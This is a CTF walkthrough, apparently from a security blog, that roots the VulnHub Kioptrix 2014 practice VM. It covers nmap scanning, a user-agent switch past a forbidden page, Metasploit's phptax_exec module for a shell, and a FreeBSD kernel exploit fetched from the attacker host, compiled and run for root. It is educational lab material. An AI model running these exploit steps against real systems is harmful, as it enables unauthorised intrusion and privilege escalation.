<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Kioptrix 5 (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-kioptrix-5-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2016-11-05T10:19:34+00:00">November 5, 2016</time><time class="updated" datetime="2025-06-10T20:30:29+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as <strong>Kioptrix: 2014 (#5) </strong>and it is another boot2root challenge provided for practice and its security level is for the beginners. So let’s try to break through it. But before please note that you can download it from here <a style="color: #000000;" href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a></span></p>
<p><span style="color: #000000;"><strong>Penetrating Methodologies</strong></span></p>
<ul>
<li><span style="color: #000000;">Network Scanning (Nmap, netdiscover)</span></li>
<li><span style="color: #000000;">Surfing HTTP service ports (80 and 8080)</span></li>
<li><span style="color: #000000;">Identifying exploit for the vulnerable Web application</span></li>
<li><span style="color: #000000;">Exploiting the target via Metasploit</span></li>
<li><span style="color: #000000;">Get Root access and capture the flag.</span></li>
</ul>
<p><span style="color: #000000;"><strong><u>Note from Author</u></strong>: Before we power on the VM, it is suggested to <strong>remove the network card and re-add it</strong>. For some oddball reason, it doesn’t get its IP. So just add the VM to your virtualization software, remove and then add a network card.</span></p>
<p><span style="color: #000000;"><strong>Lets Breach!</strong></span></p>
<p><span style="color: #000000;">Start off with finding the target using :</span></p>
<pre class="lang:default decode:true">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ujnWnkw42YA/W0sLqSi9xhI/AAAAAAAAYIM/eahpwrw786Ub0Gs8b89en2su8pCdWr8jACEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Our target is <strong>192.168.1.159</strong> Now scan the target with nmap:</span></p>
<pre class="lang:default decode:true ">nmap -A 192.168.1.159</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CGTiyGyCaAA/W0sLsCmUOmI/AAAAAAAAYIo/jGf_oYliQrc34lcFLVMRbzSMWtbCLs3XQCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">With the nmap scan result, you can see that HTTP services are running on two ports i.e. ports 80, 8080</span></p>
<p><span style="color: #000000;">As we have HTTP service running we opened it in our browser with the IP http://192.168.1.159. There is nothing significant on the webpage, except it says “it works!”. I tried searching inside the source code, hoping to find something useful, however, got nothing informative.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RMcDLPEoSN0/W0sLsVsjVqI/AAAAAAAAYJM/0BHFvHnDBdcDssaUZav89XVfeS6midNcQCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Then I remembered that HTTP service is listening on 8080 port too. So I opened the IP on the port 8080.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ffX2MzkZo6Q/W0sLsmJHy3I/AAAAAAAAYJI/iR18b_fD76ks2bkGBUfHBMq9-J7uMAo9wCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">But the access was forbidden; however, the message didn’t seem to me as an error message. It seems more to be a message with the deliberate and intentional made-up response. I tried every method to bypass this forbidden access but nothing worked. Hence I decided to use User Agent switcher to check this page in other popular browsers like Internet Explorer.</span></p>
<p><span style="color: #000000;">Download the <strong>User Agent Switcher</strong> plugin in the Mozilla and perform the following</span></p>
<p><span style="color: #000000;">Navigate to <strong>Tools menu</strong> from the <strong>menu bar</strong>. A drop-down menu will appear. From this menu select <strong>Default User Agent</strong>. Another menu will open and from this select <strong>Internet Explorer</strong>, from this, another menu will open and from it select <strong>Internet Explorer 6</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tIjIMgeW81o/W0sLsk7MksI/AAAAAAAAYJM/JMnYS2-toVQe3jdIJLcX0edVv_DSXA-GACEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">And fortunately, we have access to the page. And found a file called <strong>phptax/</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-saLA9G_iAso/W0sLqQl2kPI/AAAAAAAAYI8/PPq3BPNsO7E8GE0Sr-qJdldBsQ1PbVuywCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now open this link and you will have the following page:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-pHeBedvz6bo/W0sLqg48SpI/AAAAAAAAYI8/ilIekaSrZuUm8FoswaLvK26KYGF3m_i4gCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">The page was of phptax. Phptax is a kind of CMS for Linux OS. Its aim is to develop a tax program which uses a database-less methodology that fits in one line text files. Using the phptax does not require SQL databases that are generally used in this program. And to our luck, there exists an exploit of phptax in Metasploit, for that simply type <strong>search phptax</strong> in Metasploit MSF Console.</span></p>
<p><span style="color: #000000;">To use this exploit simply type the following in Metasploit:</span></p>
<pre class="lang:default decode:true">msf &gt; use exploit/multi/http/phptax_exec
msf exploit(phptax_exec) &gt; set rhost 192.168.1.159
msf exploit(phptax_exec) &gt; set rport 8080
msf exploit(phptax_exec) &gt; exploit</pre>
<p><span style="color: #000000;"><strong> </strong>Great!! We got command shell session1 of the victim’s machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-8LWpyXTZIds/W0sLrIJyLxI/AAAAAAAAYJE/1B2CW3_oRkIlVvQuuXc9j0p_tlNqOImcgCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">There is an exploit for this version of the kernel in exploit-db.com. Alternatively, we can also search with the help of <strong>searchsploit FreeBSD 9.0</strong> command in the Kali Linux as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--a7l-loyL40/W0sLrYJZdLI/AAAAAAAAYI8/6ZsWRVSDd7wRhCB-WnzZhHu4yGp5Dy6_gCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Copy the exploit from its default location to the Desktop:</span></p>
<pre class="lang:default decode:true">cp /usr/share/exploitdb/exploits/freebsd/local/28718.c .</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-M5j2bIX8d8I/W0sLreK0oAI/AAAAAAAAYJA/nztWgHEF4tonnMQ4ZFsidpmFruTk-o8WQCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Here, we used fetch command because wget command wasn’t working. So, using fetch is a substitute for wget command and so we are directly using it from the browser. We compile the file, save it as the kernel and provide executable permissions.</span></p>
<pre class="lang:default decode:true">fetch http://192.168.1.108/28718.c
gcc –o kernel 28718.c  
chmod 777 kernel</pre>
<p><span style="color: #000000;">Then type the following command to execute the exploit :</span></p>
<pre class="lang:default decode:true">./kernel</pre>
<p><span style="color: #000000;"><strong> </strong>As the exploit executes you will reach the root. And to confirm this type :</span></p>
<pre class="lang:default decode:true">id</pre>
<p><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-96YPiY0iBIY/W0sLr8wa5KI/AAAAAAAAYJA/8CqIZGWJRN4T99Mw8O_NShxDBjzPbGF5gCEwYBhgL/s1600/15.png"/> </strong></span></p>
<p><span style="color: #000000;"><strong> </strong>Then moving forward go to the root folder by typing :</span></p>
<pre class="lang:default decode:true">cd /root</pre>
<p><span style="color: #000000;">Let’s see what directories it has and for that type :</span></p>
<pre class="lang:default decode:true">ls</pre>
<p><span style="color: #000000;">Here we have a <em>congrats.txt</em> named text file and I am hoping this will be our flag so to read it type :</span></p>
<pre class="lang:default decode:true ">cat congrats.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-XJigr-Mt-pY/W0sLsLHSdZI/AAAAAAAAYJA/5Vk-HtAsvXUra19SVtdd-nZkkRZBb-KOACEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;"><strong>Author:</strong> Ankur Sachdev is an Information Security consultant and researcher in the field of Network &amp; WebApp Penetration Testing. Contact <strong><a href="https://www.linkedin.com/in/sachdevankur/">Here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
